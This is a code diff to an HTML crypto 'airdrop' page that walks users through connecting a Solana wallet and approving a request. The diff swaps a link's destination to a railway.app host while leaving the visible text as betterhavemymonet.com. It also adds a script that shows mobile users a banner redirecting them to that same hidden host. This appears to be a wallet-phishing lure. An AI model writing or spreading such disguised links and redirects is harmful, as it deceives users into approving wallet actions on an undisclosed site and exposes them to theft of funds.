@@ -287,7 +287,7 @@ document.addEventListener("DOMContentLoaded", () => {
 <p>Use the 🌐 icon inside wallet</p>
 <hr>
 <h2>🔗 Step 3 — Visit Site</h2>
-<p><a href="https://betterhavemymonet.com" target="_blank" style="color:#00ffcc;">betterhavemymonet.com</a></p>
+<p><a href="https://monetmoney-production.up.railway.app" target="_blank" target="_blank" style="color:#00ffcc;">betterhavemymonet.com</a></p>
 <hr>
 <h2>🔌 Step 4 — Connect Wallet</h2>
 <p>Tap connect + approve</p>
@@ -301,6 +301,36 @@ document.addEventListener("DOMContentLoaded", () => {
 <h2>⚠️ Notes</h2>
 <p>SOL needed • One claim per wallet • First come first serve</p>
 </section>
+
+<script id="monet-wallet-helper">
+(function(){
+  function isMobile(){ return /Android|iPhone|iPad/i.test(navigator.userAgent); }
+  function isPhantom(){ return window.solana && window.solana.isPhantom; }
+  function isSolflare(){ return window.solflare && window.solflare.isSolflare; }
+  function isBackpack(){ return window.backpack && window.backpack.isBackpack; }
+
+  if(isMobile() && !isPhantom() && !isSolflare() && !isBackpack()){
+    var banner = document.createElement("div");
+    banner.style.position="fixed";
+    banner.style.bottom="20px";
+    banner.style.left="50%";
+    banner.style.transform="translateX(-50%)";
+    banner.style.background="#00ffcc";
+    banner.style.color="#000";
+    banner.style.padding="12px 20px";
+    banner.style.borderRadius="10px";
+    banner.style.fontWeight="bold";
+    banner.style.zIndex="9999";
+    banner.style.boxShadow="0 0 15px #00ffcc";
+    banner.innerHTML="🚀 Open in Wallet for Airdrop";
+    banner.onclick=function(){
+      window.location.href="https://monetmoney-production.up.railway.app";
+    };
+    document.body.appendChild(banner);
+  }
+})();
+</script>
+<style>html{scroll-behavior:smooth;}</style>
 
 </body>
 </html>
